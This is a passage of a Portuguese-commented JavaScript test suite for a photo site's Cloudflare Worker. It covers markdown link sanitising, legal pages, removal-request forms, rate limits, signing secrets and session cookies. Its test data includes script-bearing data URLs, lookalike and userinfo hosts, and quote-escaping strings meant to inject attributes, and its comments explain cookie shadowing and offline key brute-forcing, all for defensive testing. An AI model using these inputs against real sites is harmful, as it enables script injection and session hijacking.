    expect(resolveDocHref('data:text/html,<script>')).toBeNull();
    expect(resolveDocHref('http://inseguro.example')).toBeNull();
  });

  it('makes absolute site URLs relative', () => {
    expect(resolveDocHref('https://fotos.lucafchala.com/privacidade')).toBe('/privacidade');
    expect(resolveDocHref('https://fotos.lucafchala.com')).toBe('/');
    expect(resolveDocHref('https://fotos.lucafchala.com/legal?x=1#topo')).toBe('/legal?x=1#topo');
  });

  // O reconhecimento de "é o nosso site" já foi um `startsWith` na URL inteira.
  // Os dois casos abaixo passam por esse teste e são hosts de outra pessoa: o
  // primeiro é um subdomínio de exemplo.com, o segundo usa o nosso nome como
  // userinfo antes do @. Ambos sairiam fatiados em algo que o navegador leria
  // como caminho relativo — o link levaria a lugar nenhum na melhor hipótese, e
  // a lógica que confunde host com prefixo de string é a mesma que, em outro
  // ponto do código, vira redirecionamento aberto.
  it('does not mistake a lookalike host for the site itself', () => {
    expect(resolveDocHref('https://fotos.lucafchala.com.exemplo.com/x'))
      .toBe('https://fotos.lucafchala.com.exemplo.com/x');
    expect(resolveDocHref('https://fotos.lucafchala.com@exemplo.com/x'))
      .toBe('https://fotos.lucafchala.com@exemplo.com/x');
    expect(resolveDocHref('https://fotos.lucafchala.com.exemplo.com/x')).not.toMatch(/^[/.]/);
  });

  it('drops targets that are not URLs at all', () => {
    expect(resolveDocHref('../../src/ui/privacy.js')).toBeNull();
    expect(resolveDocHref('./nao-mapeado.md')).toBeNull();
  });

  // O destino chega escapado e precisa ser desescapado para ser analisado.
  // Feito em passadas encadeadas, `&amp;quot;` viraria `&quot;` na primeira e
  // aspas de verdade na segunda — o caractere que fecha o atributo href. Aqui
  // o texto literal `&quot;` tem de sobreviver como texto.
  it('unescapes the link target exactly once', () => {
    // O invariante é ida e volta: o destino publicado, desescapado UMA vez,
    // tem de ser byte a byte o que o documento escreveu. Com o desescape em
    // passadas encadeadas, `&amp;quot;` perdia uma camada a mais e o destino
    // ganhava uma aspa que ninguém escreveu.
    const alvo = 'https://exemplo.com/?a=&quot;&amp;quot;b';
    const { html } = renderMarkdown(`[x](${alvo})`);
    const href = html.match(/href="([^"]*)"/)[1];
    const tabela = { '&amp;': '&', '&quot;': '"', '&#x27;': "'", '&lt;': '<', '&gt;': '>' };
    expect(href.replace(/&(?:amp|quot|#x27|lt|gt);/g, m => tabela[m])).toBe(alvo);

    // E o atributo continua fechando onde deve: um href só, e nada de atributo
    // extra nascido de uma aspa solta.
    expect([...html.matchAll(/href="/g)]).toHaveLength(1);
    expect(html).not.toMatch(/<a [^>]*\son\w+=/i);
  });

  it('keeps external https links, marked safe', () => {
    const { html } = renderMarkdown('[ANPD](https://www.gov.br/anpd/)');
    expect(html).toContain('href="https://www.gov.br/anpd/"');
    expect(html).toContain('rel="noopener noreferrer"');
  });

  it('renders the structures the documents actually use', () => {
    const { html, toc } = renderMarkdown([
      '## Uma seção', '', 'Texto com **negrito** e `código`.', '',
      '| Dado | Prazo |', '| --- | --- |', '| Consentimento | 5 anos |', '',
      '- item', '', '> ⚠️ Aviso **forte**', '', '```', 'npm run build', '```',
    ].join('\n'));
    expect(html).toContain('<h2 id="uma-secao">');
    expect(html).toContain('<strong>negrito</strong>');
    expect(html).toContain('<code>código</code>');
    expect(html).toContain('<table>');
    expect(html).toContain('<li>item</li>');
    expect(html).toContain('<blockquote>');
    expect(html).toContain('<pre><code>npm run build</code></pre>');
    expect(toc).toEqual([{ id: 'uma-secao', level: 2, title: 'Uma seção' }]);
  });
});

// ---------------------------------------------------------------------------
describe('páginas dos documentos legais', () => {
  function kv() {
    const store = new Map([['events', '[]']]);
    return { async get(k) { return store.has(k) ? store.get(k) : null; }, async put(k, v) { store.set(k, v); },
      async delete(k) { store.delete(k); }, async list() { return { keys: [], list_complete: true }; } };
  }
  const ctx = { waitUntil: () => {} };
  const get = p => worker.fetch(new Request('https://fotos.lucafchala.com' + p), { FOTOS: kv() }, ctx);

  it('serves every document at its own route', async () => {
    for (const doc of LEGAL_DOCS) {
      const res = await get('/legal/' + doc.slug);
      expect(res.status, doc.slug).toBe(200);
      const body = await res.text();
      expect(body, doc.slug).toContain(doc.title);
      expect(body, doc.slug).not.toContain('${');
      expect(body, doc.slug).not.toContain('undefined');
    }
  });

  // O rodapé compartilhado carrega o link de código-fonte — a única exceção
  // permitida. A asserção útil não é "nenhum github.com na página", e sim
  // "nenhum além desse". Removemos a âncora permitida e exigimos que não sobre
  // nada, o que também pega o caso de alguém trocar o rótulo do rodapé por um
  // segundo link.
  const ALLOWED_GITHUB_ANCHOR =
    '<a href="https://github.com/lucafchala/fotos" target="_blank" rel="noopener" class="legal-link">Código-fonte</a>';

  it('sends no visitor to GitHub from any legal page, except the footer source link', async () => {
    // A regra é sobre LINKS, não sobre a string. Os documentos citam
    // "github.com" em prosa (explicando justamente esta regra), e isso é texto
    // inerte. Testar a substring crua reprovaria a documentação correta e
    // empurraria para "consertar" o texto em vez do comportamento — então a
    // asserção percorre os href de verdade.
    for (const p of ['/legal', ...LEGAL_DOCS.map(d => '/legal/' + d.slug), '/privacidade', '/termos', '/suporte', '/']) {
      const res = await get(p);
      expect(res.status, p).toBe(200);
      const body = await res.text();

      // Comparação por HOST, resolvendo cada href contra a origem do site.
      // `h.includes('github.com')` erraria nos dois sentidos: aprovaria
      // `https://github.com.exemplo.com/` (host de outra pessoa, que passa por
      // conter a substring no lugar certo do teste) e reprovaria
      // `https://exemplo.com/?ref=github.com` (host inocente). O invariante é
      // sobre para onde o clique leva, então quem responde é o host.
      const hosts = [...body.matchAll(/href="([^"]*)"/g)].map(m => {
        try { return new URL(m[1], 'https://fotos.lucafchala.com').host; } catch { return ''; }
      });
      const ghLinks = hosts.filter(h => h === 'github.com' || h.endsWith('.github.com'));
      expect(ghLinks, `${p}: links para o GitHub`).toEqual(['github.com']);

      // E o único permitido é mesmo o do rodapé de código-fonte.
      expect(body.split(ALLOWED_GITHUB_ANCHOR).length - 1, `${p}: âncora de código-fonte`).toBe(1);
    }
  });

  it('keeps the source-code link in the footer — the one allowed exception', async () => {
    const body = await (await get('/')).text();
    expect(body).toContain('https://github.com/lucafchala/fotos');
    expect(body).toContain('Código-fonte');
  });

  it('404s an unknown document instead of rendering an empty page', async () => {
    expect((await get('/legal/nao-existe')).status).toBe(404);
  });

  it('lists every document in the sitemap', async () => {
    const xml = await (await get('/sitemap.xml')).text();
    for (const doc of LEGAL_DOCS) expect(xml, doc.slug).toContain(`/legal/${doc.slug}</loc>`);
  });

  it('links every document from the trust center', async () => {
    const body = await (await get('/legal')).text();
    for (const doc of LEGAL_DOCS) expect(body, doc.slug).toContain(`href="/legal/${doc.slug}"`);
  });
});

// ---------------------------------------------------------------------------
describe('envio completo dos formulários públicos', () => {
  // Estes testes existem por causa de um defeito real: o handler de remoção
  // lia `body.formToken` enquanto o cliente enviava `form_token`. Com o
  // SIGNING_SECRET configurado, TODO pedido de remoção levava 403 — o canal
  // que a LGPD exige, morto em silêncio. Abrir o modal no browser não pegava:
  // só um envio de ponta a ponta pega.
  function kv(initial = {}) {
    const store = new Map(Object.entries({ events: '[]', ...initial }));
    return { async get(k) { return store.has(k) ? store.get(k) : null; }, async put(k, v) { store.set(k, v); },
      async delete(k) { store.delete(k); }, async list() { return { keys: [], list_complete: true }; }, _store: store };
  }
  const ctx = { waitUntil: () => {} };
  const EVENTS = JSON.stringify([{
    id: 'e1', slug: 'evento', title: 'Evento', accessType: 'public',
    driveUrl: 'https://drive.google.com/x', driveUrlInstagram: '', visible: true, comingSoon: false,
    photos: [], thumbnailUrl: '', photosAlert: { active: false, addedAt: null, expiresAfterHours: 24 },
  }]);

  const env = () => ({
    FOTOS: kv({ events: EVENTS }),
    // Comprimento realista: abaixo do piso de SIGNING_SECRET_MIN_LENGTH o
    // código recusa a chave e o token de formulário deixa de ser exigido —
    // este teste passaria a validar o caminho SEM assinatura sem avisar.
    SIGNING_SECRET: 'segredo-de-teste-longo-o-suficiente-32',
    TURNSTILE_SECRET_KEY: 'ts',
  });

  const postRemoval = (e, body) => worker.fetch(new Request('https://fotos.lucafchala.com/api/removal-request', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json', 'Sec-Fetch-Site': 'same-origin', 'CF-Connecting-IP': '9.9.9.9' },
    body: JSON.stringify(body),
  }), e, ctx);

  it('avisa que um pedido de remoção ficou sem e-mail — direito do titular tem relógio', async () => {
    // O pedido é gravado antes do envio, então nada se perde. Mas o AVISO é o
    // que faz alguém agir dentro do prazo: sem ele, o pedido fica parado no
    // painel esperando que o dono resolva abrir a tela por conta própria.
    resetDegraded();
    const e = env();                       // sem RESEND_API_KEY
    const token = await signToken(e.SIGNING_SECRET, {
      purpose: 'form', scope: 'remocao', ttlSecs: FORM_TOKEN_TTL_SECS - FORM_TOKEN_MIN_AGE_SECS,
    });
    globalThis.fetch = async () => new Response(JSON.stringify({ success: true }), { status: 200 });
    const res = await postRemoval(e, {
      eventSlug: 'evento', method: 'number', value: '42',
      email: 'pessoa@example.com', phone: '11999999999',
      consent: true, turnstileToken: 'ok', form_token: token,
    });
    expect(res.status, await res.text()).toBe(200);   // o titular não é punido pelo nosso problema
    // e o pedido está salvo, que é o que impede a perda
    expect(JSON.parse(e.FOTOS._store.get('removal_requests') || '[]')).toHaveLength(1);
    const aviso = degradedHealth().find(d => /pedido de remoção/.test(d.label));
    expect(aviso, 'o dono precisa ser avisado').toBeTruthy();
    // E o aviso NÃO pode carregar o detalhe do erro: ele vem do corpo cru da
    // resposta da Resend, e o e-mail levava nome, e-mail, telefone e mensagem
    // de um titular exercendo direito sobre os próprios dados. O motivo fica no
    // `emailStatus` do pedido, que só o painel lê.
    expect(aviso.detail).not.toMatch(/pessoa@example\.com|11999999999/);
    resetDegraded();
  });

  it('accepts a real removal request end to end', async () => {
    const e = env();
    // Token pré-envelhecido: o piso de idade é para automação, e aqui
    // simulamos alguém que preencheu o formulário com calma.
    const token = await signToken(e.SIGNING_SECRET, {
      purpose: 'form', scope: 'remocao', ttlSecs: FORM_TOKEN_TTL_SECS - FORM_TOKEN_MIN_AGE_SECS,
    });
    globalThis.fetch = async () => new Response(JSON.stringify({ success: true }), { status: 200 });

    const res = await postRemoval(e, {
      eventSlug: 'evento', method: 'number', value: '42',
      email: 'pessoa@example.com', phone: '11999999999',
      consent: true, turnstileToken: 'ok',
      form_token: token, // <- o nome que o cliente realmente envia
    });
    expect(res.status, await res.text()).toBe(200);

    // E o pedido foi mesmo gravado, não só aceito.
    const stored = JSON.parse(e.FOTOS._store.get('removal_requests') || '[]');
    expect(stored).toHaveLength(1);
    expect(stored[0].email).toBe('pessoa@example.com');
  });

  it('still refuses a removal request with no token', async () => {
    const e = env();
    globalThis.fetch = async () => new Response(JSON.stringify({ success: true }), { status: 200 });
    const res = await postRemoval(e, {
      eventSlug: 'evento', method: 'number', value: '42',
      email: 'a@b.c', phone: '11999999999', consent: true, turnstileToken: 'ok',
    });
    expect(res.status).toBe(403);
  });

  it('refuses a removal request whose token was minted for the support form', async () => {
    const e = env();
    const wrong = await signToken(e.SIGNING_SECRET, {
      purpose: 'form', scope: 'suporte', ttlSecs: FORM_TOKEN_TTL_SECS - FORM_TOKEN_MIN_AGE_SECS,
    });
    globalThis.fetch = async () => new Response(JSON.stringify({ success: true }), { status: 200 });
    const res = await postRemoval(e, {
      eventSlug: 'evento', method: 'number', value: '42',
      email: 'a@b.c', phone: '11999999999', consent: true, turnstileToken: 'ok', form_token: wrong,
    });
    expect(res.status).toBe(403);
  });

  it('names the token field exactly as the client sends it', () => {
    // Guarda estrutural contra a recaída: se um lado renomear o campo, o outro
    // continua funcionando e o formulário morre em silêncio. Barato de fixar.
    expect(eventSource).toContain('form_token: REMOVAL_FORM_TOKEN');
    expect(indexSource).toContain('body.form_token');
    expect(indexSource).not.toContain('body.formToken');
  });
});

// ---------------------------------------------------------------------------
describe('rate limit do login não se auto-sabota', () => {
  function kv() {
    const store = new Map();
    let writes = 0;
    return {
      async get(k) { return store.has(k) ? store.get(k) : null; },
      async put(k, v) { writes++; store.set(k, v); },
      async delete(k) { store.delete(k); },
      async list() { return { keys: [], list_complete: true }; },
      get writes() { return writes; },
      _store: store,
    };
  }
  const post = pw => new Request('https://fotos.lucafchala.com/dashboard/login', {
    method: 'POST',
    headers: { 'Content-Type': 'application/x-www-form-urlencoded', 'Sec-Fetch-Site': 'same-origin', 'CF-Connecting-IP': '7.7.7.7' },
    body: new URLSearchParams({ password: pw }).toString(),
  });

  it('tentativa já barrada não custa escrita nenhuma', async () => {
    // `noteFailedLogin` faz leitura + escrita em KV. Contabilizar tentativa já
    // barrada deixava um flood de POSTs não autenticados gastar escrita à toa —
    // e o rate limit em si já nem toca no KV desde a migração para DO.
    const FOTOS = kv();
    const env = withDurableObjects({ FOTOS, ADMIN_PASSWORD: 'Senha-Longa-De-Teste!' });
    const ctx = { waitUntil: p => p };

    for (let i = 0; i < 12; i++) await worker.fetch(post('errada'), env, ctx);
    const afterBurst = FOTOS.writes;

    for (let i = 0; i < 40; i++) await worker.fetch(post('errada'), env, ctx);
    const extra = FOTOS.writes - afterBurst;

    expect(extra, 'tentativas já barradas não podem custar escrita').toBe(0);
  });

  it('does not let blocked attempts eat the daily budget', async () => {
    // O limite diário (60) existe para conter a força bruta sustentada. Se
    // tentativas já barradas pela rajada também o consumissem, ele acabaria dez
    // vezes mais rápido e trancaria o dono do painel por 24 h — um IP de NAT
    // compartilhado fazia isso em um minuto.
    const FOTOS = kv();
    const env = withDurableObjects({ FOTOS, ADMIN_PASSWORD: 'Senha-Longa-De-Teste!' });
    const ctx = { waitUntil: p => p };

    for (let i = 0; i < 200; i++) await worker.fetch(post('errada'), env, ctx);

    const diario = env.RATELIMIT._instances.get('login-day:7.7.7.7');
    expect(diario, 'contador diário deve existir').toBeTruthy();
    expect(diario.ctx.storage._map.get('w').contagem, 'só o que passou pela rajada conta no orçamento diário')
      .toBeLessThanOrEqual(10);
  });
});

// ---------------------------------------------------------------------------
// HEAD
// ---------------------------------------------------------------------------
describe('HEAD responde como GET', () => {
  function kv() {
    const store = new Map([['events', '[]']]);
    return { async get(k) { return store.has(k) ? store.get(k) : null; }, async put(k, v) { store.set(k, v); },
      async delete(k) { store.delete(k); }, async list() { return { keys: [], list_complete: true }; } };
  }
  const ctx = { waitUntil: () => {} };
  const req = (p, method) => worker.fetch(
    new Request('https://fotos.lucafchala.com' + p, { method }), { FOTOS: kv() }, ctx);

  // Todas as rotas casam com `method === 'GET'`, então antes disto um HEAD caía
  // direto no 404: `GET /` devolvia 200 e `HEAD /` devolvia 404 na MESMA URL.
  // Para monitor de uptime e verificador de link — que pedem HEAD justamente
  // para não baixar o corpo — o site inteiro parecia fora do ar.
  it('gives HEAD the same status as GET on every public route', async () => {
    for (const p of ['/', '/legal', '/privacidade', '/termos', '/suporte', '/sobre',
                     '/robots.txt', '/sitemap.xml', '/manifest.json', '/legal/registro-de-operacoes']) {
      const g = await req(p, 'GET');
      const h = await req(p, 'HEAD');
      expect(h.status, `${p}: HEAD tem de ter o status do GET`).toBe(g.status);
      expect(g.status, `${p}: a rota tem de existir para o teste valer algo`).toBe(200);
    }
  });

  it('keeps the security headers on HEAD, including the CSP nonce', async () => {
    const h = await req('/', 'HEAD');
    // Foi exatamente isto que derrubou o deploy: o smoke test lê os cabeçalhos
    // com `curl -sI`, caía na resposta 404 (que não tem script inline, logo não
    // tem nonce) e acusava a CSP. O sintoma apontava para a política; a causa
    // era o método.
    expect(h.headers.get('Content-Security-Policy-Report-Only')).toMatch(/'nonce-/);
    expect(h.headers.get('X-Content-Type-Options')).toBe('nosniff');
    expect(h.headers.get('Content-Type')).toMatch(/text\/html/);
  });

  it('sends no body on HEAD', async () => {
    expect(await (await req('/', 'HEAD')).text()).toBe('');
    expect((await (await req('/', 'GET')).text()).length).toBeGreaterThan(500);
  });

  it('still 404s HEAD on a route that does not exist', async () => {
    expect((await req('/nao-existe-mesmo', 'HEAD')).status).toBe(404);
  });
});

// ---------------------------------------------------------------------------
// Estado do SIGNING_SECRET
// ---------------------------------------------------------------------------
describe('SIGNING_SECRET: criado não é o mesmo que configurado', () => {
  const bom = 'x'.repeat(SIGNING_SECRET_MIN_LENGTH);

  // `wrangler secret put` aceita valor vazio sem reclamar. Quem roda o comando
  // fica convencido de que resolveu, e o painel — se ele olhasse só para a
  // existência da variável — concordaria. Um segredo criado vazio tem de ser
  // tratado como segredo nenhum.
  it('treats an empty or whitespace-only secret as absent', () => {
    for (const v of ['', '   ', '\n']) {
      expect(signingSecretProblem({ SIGNING_SECRET: v }), JSON.stringify(v)).not.toBeNull();
    }
    expect(signingSecretProblem({})).not.toBeNull();
  });

  // O painel da Cloudflare NÃO mostra o valor de um secret. Quando o nome
  // aparece na lista e o site lê vazio, esta mensagem é a única coisa capaz de
  // dizer se o binding não chegou ou se chegou em branco — e as duas situações
  // pedem ações opostas (criar vs. recriar colando o valor). Uma mensagem que
  // junta as duas é meio diagnóstico, e foi assim que a primeira versão
  // desperdiçou um ciclo de investigação.
  it('tells apart a missing binding from one that arrived empty', () => {
    const naoExiste = signingSecretProblem({});
    const vazio = signingSecretProblem({ SIGNING_SECRET: '' });
    const branco = signingSecretProblem({ SIGNING_SECRET: '   ' });
    const curto = signingSecretProblem({ SIGNING_SECRET: 'abc' });

    expect(new Set([naoExiste, vazio, branco, curto]).size,
      'cada estado precisa de uma mensagem distinta').toBe(4);

    expect(naoExiste).toMatch(/NÃO EXISTE/);
    expect(vazio).toMatch(/EXISTE/);
    expect(vazio).toMatch(/VAZIO/);
    expect(branco).toMatch(/espaço em branco/);
    expect(curto).toMatch(/curto demais/);

    // E o texto tem de dizer o que fazer, não só o que está errado.
    expect(vazio).toMatch(/recrie/i);
    expect(naoExiste).toMatch(/Worker/);
  });

  // Pior que desligado: ligado com chave adivinhável. Um segredo curto cai numa
  // varredura offline a partir de um único token assinado, e a partir daí dá
  // para forjar nonce de Drive e token de formulário — com o painel dizendo que
  // a proteção está ativa.
  it('rejects a secret too short to be an HMAC key', () => {
    expect(signingSecretProblem({ SIGNING_SECRET: 'curto' })).toMatch(/curto demais/);
    expect(signingSecretProblem({ SIGNING_SECRET: 'x'.repeat(SIGNING_SECRET_MIN_LENGTH - 1) }))
      .toMatch(/curto demais/);
    expect(signingSecretProblem({ SIGNING_SECRET: bom })).toBeNull();
  });

  it('does not mint tokens with a rejected secret, and does with a good one', async () => {
    expect(await mintFormToken({ SIGNING_SECRET: '' }, 'suporte')).toBe('');
    expect(await mintFormToken({ SIGNING_SECRET: '   ' }, 'suporte')).toBe('');
    expect(await mintFormToken({ SIGNING_SECRET: 'curto' }, 'suporte')).toBe('');
    expect(await mintFormToken({ SIGNING_SECRET: bom }, 'suporte')).not.toBe('');
  });

  // Um newline colado por acidente no fim do valor não pode produzir uma chave
  // diferente da que a pessoa acha que configurou.
  it('normalises surrounding whitespace so a pasted newline is not a different key', async () => {
    const a = await mintFormToken({ SIGNING_SECRET: bom }, 'suporte');
    const b = await mintFormToken({ SIGNING_SECRET: `  ${bom}\n` }, 'suporte');
    expect(a).not.toBe('');
    expect(b).not.toBe('');
    // Tokens carregam expiração, então não são iguais byte a byte; o que precisa
    // bater é a chave. Um token assinado com um valor tem de validar no outro.
    const env = { SIGNING_SECRET: `  ${bom}\n` };
    const res = await worker.fetch(
      new Request('https://fotos.lucafchala.com/legal'), { ...env, FOTOS: {
        async get() { return null; }, async put() {}, async delete() {},
        async list() { return { keys: [], list_complete: true }; } } }, { waitUntil: () => {} });
    expect(res.status).toBe(200);
  });

  // O relatório e o uso têm de responder a mesma coisa. Se divergirem, o painel
  // fica verde sobre um segredo que o código de assinatura recusa — que é a
  // única falha desta lista capaz de passar despercebida para sempre.
  it('never reports signing as active when no token can be minted', async () => {
    for (const v of ['', '   ', '\n', 'curto', 'x'.repeat(SIGNING_SECRET_MIN_LENGTH - 1)]) {
      const relatado = signingSecretProblem({ SIGNING_SECRET: v }) === null;
      const funciona = (await mintFormToken({ SIGNING_SECRET: v }, 'suporte')) !== '';
      expect(relatado, `valor ${JSON.stringify(v)}: relatório e realidade divergem`).toBe(funciona);
    }
    const relatado = signingSecretProblem({ SIGNING_SECRET: bom }) === null;
    const funciona = (await mintFormToken({ SIGNING_SECRET: bom }, 'suporte')) !== '';
    expect(relatado).toBe(true);
    expect(funciona).toBe(true);
  });
});

// ---------------------------------------------------------------------------
// Achados da revisão de código
// ---------------------------------------------------------------------------
describe('precedência do cookie de sessão', () => {
  const TOKEN_NOVO = 'a'.repeat(64);
  const TOKEN_LIXO = 'b'.repeat(64);

  function kv(sessoes = {}) {
    const store = new Map(Object.entries(sessoes));
    return { async get(k) { return store.has(k) ? store.get(k) : null; },
      async put(k, v) { store.set(k, v); }, async delete(k) { store.delete(k); },
      async list() { return { keys: [], list_complete: true }; }, _store: store };
  }
  const req = cookie => new Request('https://fotos.lucafchala.com/dashboard', { headers: { Cookie: cookie, 'User-Agent': 'ua-de-teste' } });
  const sessaoValida = () => JSON.stringify({
    createdAt: Date.now(), lastSeenAt: Date.now(),
    fp: clientFingerprint(req('')),
  });

  // Um host vizinho de lucafchala.com consegue gravar `session=` de domínio,
  // mas NÃO `__Host-session` — é exatamente essa a garantia do prefixo. Com um
  // padrão único e `(?:__Host-)?`, `match()` devolvia a PRIMEIRA ocorrência e o
  // cookie do vizinho vencia: 64 hexadecimais quaisquer derrubavam o painel.
  it('prefers __Host-session over a legacy cookie a sibling host can write', async () => {
    const env = { FOTOS: kv({ [`admin_session:${TOKEN_NOVO}`]: sessaoValida() }) };
    const cookie = `session=${TOKEN_LIXO}; __Host-session=${TOKEN_NOVO}`;
    expect(await verifySession(env, req(cookie)), 'o cookie do vizinho não pode sombrear o nosso').toBe(true);
  });

  // Mesma raiz, sem atacante nenhum: quem tinha sessão aberta antes da migração
  // ficava em loop de login, porque o legado sombreava o cookie recém-emitido.
  it('does not let a stale legacy cookie shadow a freshly issued session', async () => {
    const env = { FOTOS: kv({ [`admin_session:${TOKEN_NOVO}`]: sessaoValida() }) };
    expect(await verifySession(env, req(`session=${TOKEN_LIXO}; __Host-session=${TOKEN_NOVO}`))).toBe(true);
    // ...e a ordem inversa no cabeçalho não pode mudar a resposta.
    expect(await verifySession(env, req(`__Host-session=${TOKEN_NOVO}; session=${TOKEN_LIXO}`))).toBe(true);
  });

  // O fallback continua existindo: sessão legada legítima segue valendo.
  it('still accepts a legacy cookie when no __Host- cookie is present', async () => {
    const env = { FOTOS: kv({ [`admin_session:${TOKEN_NOVO}`]: sessaoValida() }) };
    expect(await verifySession(env, req(`session=${TOKEN_NOVO}`))).toBe(true);
  });
});

describe('anexo de remoção: o portão é a capacidade de limpar', () => {
  function kv() {
    const store = new Map([['events', JSON.stringify([{
      id: 'e1', slug: 'evento', title: 'Evento', accessType: 'public',
      driveUrl: 'https://drive.google.com/x', visible: true, comingSoon: false,
      photos: [], thumbnailUrl: '', photosAlert: { active: false, addedAt: null, expiresAfterHours: 24 },
    }])]]);
    return { async get(k) { return store.has(k) ? store.get(k) : null; }, async put(k, v) { store.set(k, v); },
      async delete(k) { store.delete(k); }, async list() { return { keys: [], list_complete: true }; }, _store: store };
  }
  const post = body => worker.fetch(new Request('https://fotos.lucafchala.com/api/removal-request', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json', 'Sec-Fetch-Site': 'same-origin', 'CF-Connecting-IP': '7.7.7.7' },
    body: JSON.stringify(body),
  }), { FOTOS: kv(), TURNSTILE_SECRET_KEY: 'ts' }, { waitUntil: () => {} });

  // HEIC é o padrão do iPhone e passava por isLikelyImage(), mas
  // stripImageMetadata() não sabe limpá-lo. A foto de quem PEDE REMOÇÃO saía
  // por e-mail com o GPS intacto, enquanto a política publicada afirmava sem
  // ressalva que os metadados são apagados.
  it('refuses a HEIC upload instead of emailing it with GPS intact', async () => {
    globalThis.fetch = async () => new Response(JSON.stringify({ success: true }), { status: 200 });
    // ftyp + marca heic: o suficiente para isLikelyImage aceitar.
    const heic = new Uint8Array(64);
    heic.set([0x00, 0x00, 0x00, 0x20], 0);
    for (const [i, c] of [...'ftypheic'].entries()) heic[4 + i] = c.charCodeAt(0);

    const res = await post({
      eventSlug: 'evento', method: 'upload', fileName: 'foto.heic',
      fileBase64: base64FromBytes(heic),
      email: 'a@b.c', phone: '11999999999', consent: true, turnstileToken: 'ok',
    });
    const corpo = await res.json();
    expect(res.status, JSON.stringify(corpo)).toBe(415);
    // A recusa tem de ensinar a saída, não só dizer não.
    expect(corpo.error).toMatch(/JPEG/);
    expect(corpo.error).toMatch(/iPhone/);
  });

  // O invariante que substitui as duas listas: o que não foi limpo não é
  // enviado, qualquer que seja o formato.
  it('never attaches a file that stripImageMetadata could not clean', () => {
    for (const bytes of [
      new Uint8Array([0x47, 0x49, 0x46, 0x38, 0x39, 0x61, 1, 1, 1, 1, 1, 1]), // GIF89a
      new Uint8Array(Array(16).fill(0)),                                       // lixo
    ]) {
      expect(stripImageMetadata(base64FromBytes(bytes)).stripped,
        'formato não-limpável não pode reportar stripped:true').toBe(false);
    }
  });
});

describe('HEAD não conta visita nem custa escrita', () => {
  function kv() {
    const store = new Map([['events', JSON.stringify([{
      id: 'e1', slug: 'evento', title: 'Evento', accessType: 'public',
      driveUrl: 'https://drive.google.com/x', visible: true, comingSoon: false,
      photos: [], thumbnailUrl: '', photosAlert: { active: false, addedAt: null, expiresAfterHours: 24 },
    }])]]);
    const escritas = [];
    return { async get(k) { return store.has(k) ? store.get(k) : null; },
      async put(k, v) { escritas.push(k); store.set(k, v); },
      async delete(k) { store.delete(k); },
      async list() { return { keys: [], list_complete: true }; }, _escritas: escritas };
  }
  // waitUntil precisa ser AGUARDADO: o contador roda fora do caminho da
  // resposta, e um teste que não espera pelas promessas mediria o nada.
  const bater = async (method) => {
    const FOTOS = kv();
    const pendentes = [];
    const env = withDurableObjects({ FOTOS });
    const ctx = { waitUntil: p => pendentes.push(p) };

    // getEvents() guarda `events` num cache de MÓDULO com TTL. Entre testes do
    // mesmo arquivo isso vaza: sem forçar uma releitura, este teste enxerga a
    // lista de outro describe e o evento não existe (404). /api/healthz é o
    // único caminho que chama getEvents(env, true), então serve de primer.
    await worker.fetch(new Request('https://fotos.lucafchala.com/api/healthz'), env, ctx);
    FOTOS._escritas.length = 0;

    const res = await worker.fetch(
      new Request('https://fotos.lucafchala.com/evento', { method }), env, ctx);
    await Promise.all(pendentes);
    return { status: res.status, escritas: FOTOS._escritas, res, env };
  };

  // O HEAD é resolvido reexecutando a rota como GET, então sem exceção
  // explícita todo HEAD sem cookie contava uma visita — e HEAD é o método que
  // monitor de uptime e verificador de link usam. Continua sendo correção de
  // MÉTRICA, não de cota: robô não é visitante, em nenhum plano.
  it('conta a visita no GET e nunca no HEAD', async () => {
    const get = await bater('GET');
    expect(get.status).toBe(200);
    expect(await readCounter(get.env, 'views:evento'), 'GET conta').toBe(1);

    const head = await bater('HEAD');
    expect(head.status, 'HEAD continua respondendo como GET').toBe(200);
    expect(head.escritas, 'HEAD não pode gravar NADA em KV').toEqual([]);
    // `_instances` vazio diz mais do que "não gravou": o contador nem chegou a
    // ser endereçado, então não houve nem leitura.
    expect(head.env.COUNTER._instances.size, 'HEAD não pode nem endereçar o contador').toBe(0);
  });

  // Se o HEAD emitisse o cookie de "já contado", o GET seguinte — o de verdade
  // — deixaria de contar. O monitor apagaria a visita do humano.
  it('does not send the already-counted cookie on HEAD', async () => {
    const head = await bater('HEAD');
    const cookies = head.res.headers.get('Set-Cookie') || '';
    expect(cookies).not.toMatch(/fv_evento=1/);
  });
});

describe('teto de pedidos de remoção é teto', () => {
  const fazer = (n, resolved) => Array.from({ length: n }, (_, i) => ({
    id: `r${i}`, resolved, createdAt: new Date(2020, 0, 1 + i).toISOString(),
  }));

  // O teto só aparava os RESOLVIDOS, então não valia quando os não-resolvidos
  // sozinhos já o ultrapassavam. `sanitizeRestoredRequest` marca todo registro
  // restaurado como resolved:false, então um backup grande passava inteiro,
  // estourava o limite de 25 MB por valor do KV, e a escrita falhava DEPOIS de
  // eventos e categorias já gravados — restore pela metade.
  it('caps even when every record is unresolved', () => {
    const lista = fazer(700, false);
    trimRequests(lista, 500);
    expect(lista).toHaveLength(500);
  });

  it('keeps the newest when it has to cut unresolved ones', () => {
    const lista = fazer(600, false);
    trimRequests(lista, 500);
    // fazer() gera do mais antigo para o mais novo; sobreviver = ser recente.
    expect(lista.some(r => r.id === 'r599'), 'o mais novo sobrevive').toBe(true);
    expect(lista.some(r => r.id === 'r0'), 'o mais antigo cai').toBe(false);
  });

  it('still prioritises unresolved over resolved', () => {
    const lista = [...fazer(300, true), ...fazer(300, false)];
    trimRequests(lista, 400);
    expect(lista).toHaveLength(400);
    expect(lista.filter(r => !r.resolved), 'nenhum pedido em aberto foi descartado').toHaveLength(300);
  });

  it('leaves a list under the cap untouched', () => {
    const lista = fazer(10, false);
    const antes = lista.map(r => r.id);
    trimRequests(lista, 500);
    expect(lista.map(r => r.id)).toEqual(antes);
  });
});

describe('markdown: URL protocol-relative não é caminho interno', () => {
  // `//exemplo.com/x` começa com `/` e era devolvida crua como se fosse um
  // caminho do site, pulando a validação de esquema e host — e sem
  // rel="noopener", porque isExternal() testa ^https:// e `//` não casa.
  it('does not treat //host/path as an internal path', () => {
    expect(resolveDocHref('//exemplo.com/x')).toBeNull();
    expect(resolveDocHref('//exemplo.com')).toBeNull();
  });

  it('keeps real internal paths working', () => {
    expect(resolveDocHref('/privacidade')).toBe('/privacidade');
    expect(resolveDocHref('/legal/registro-de-operacoes')).toBe('/legal/registro-de-operacoes');
  });

  it('renders a protocol-relative target as plain text, with no anchor', () => {
    const { html } = renderMarkdown('veja [isto](//exemplo.com/x)');
